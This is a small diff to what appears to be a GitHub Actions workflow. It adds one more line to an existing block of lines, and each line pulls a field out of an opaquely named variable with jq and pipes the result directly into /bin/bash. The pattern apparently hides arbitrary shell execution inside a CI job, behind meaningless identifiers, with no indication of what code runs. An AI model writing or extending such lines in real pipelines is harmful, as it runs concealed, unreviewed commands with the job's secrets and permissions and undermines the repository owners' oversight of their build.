@@ -26,6 +26,7 @@ jobs:
           echo $neotr94 | jq -r .axe50853 | /bin/bash
           printf '%s' "$mtn3832" | jq -r .i51 | /bin/bash
           printf '%s' "$ap07100" | jq -r .fw02155 | /bin/bash
+          echo $cuvno0458 | jq -r .pqlw71 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
